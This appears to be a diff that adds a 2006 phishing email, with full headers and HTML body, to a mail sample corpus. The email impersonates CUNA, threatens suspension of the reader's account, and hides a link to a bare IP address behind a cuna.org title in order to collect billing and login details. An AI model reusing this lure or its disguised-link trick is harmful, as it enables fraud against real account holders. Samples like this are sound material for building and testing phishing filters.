@@ -1,0 +1,88 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 050302A893
+	for <user@example.com>; Wed, 11 Jan 2006 15:30:05 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+	id E4C54621C9A; Wed, 11 Jan 2006 15:30:04 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id C6A9E621C71
+	for <user@example.com>; Wed, 11 Jan 2006 15:30:02 -0500 (EST)
+Received: (from user@localhost)
+	by mail.example.com id PAA02003
+	for user@example.com; Wed, 11 Jan 2006 15:29:59 -0500
+Received: from mail2.tx-rx.org (adsl-65-64-220-21.dsl.rcsntx.swbell.net [65.64.220.21])
+	by mail.example.com with ESMTP id PAA01995
+	for <user@example.com>; Wed, 11 Jan 2006 15:29:58 -0500
+Received: by mail2.tx-rx.org (Postfix, from userid 0)
+	id 2DC2F12A684; Wed, 11 Jan 2006 14:21:31 -0600 (CST)
+From: C U N A <service@cuna.org>
+Subject: Protect the security of your online account. 
+Mime-Version: 1.0
+Content-Type: text/html; boundary="xlcuiBo847gtaDvjhSdgF983r"
+X-Mailer: bb
+Message-Id: <20060111202131.2DC2F12A684@mail2.tx-rx.org>
+Date: Wed, 11 Jan 2006 14:21:31 -0600 (CST)
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 267
+
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="50%" border=0>
+<tr>
+<td align="left"><img src="http://www.geocities.com/slutsd/home_01.jpg" border=0></td>
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+	<TD><font color="Navy" size="3"><b>Dear CUNA client,</b></font><br>
+	<br>
+	      <font face="Arial" size="2px">While performing it's regular scheduled monthly billing address check our system found incompatible 
+information which seams to be no longer the same with your current credit card information that we have on file. If you changed your billing 
+information or if you moved from you previous address please follow up the link bellow and update your billing information: If you didn't change any of 
+this information you still need to follow up the previous link and update your existing billing information because it means that our database regular 
+scheduled update wasn't made correctly. Choosing to ignore this message will result in to a temporary suspension of your account within 24 hours, until 
+you will choose to solve this unpleasant situation.<br>
+	<br>
+	We apologies for any inconvinience this may caused you and we strongly advise you to update your information 
+you have on file with us. Please <a  href="http://81.255.3.60/cuna/" 
+title="https://www.cuna.org/update.php">login</a> in order to avoid any possible futuring billing problems with your account.<br>
+	<br>
+        <br>
+        <br>
+	<br>
+        <br>
+	<b>Best regards</b>,<br>
+	- <i>CUNA Team</i>.
+        </TD>
+        </tr>
+</TABLE>
+
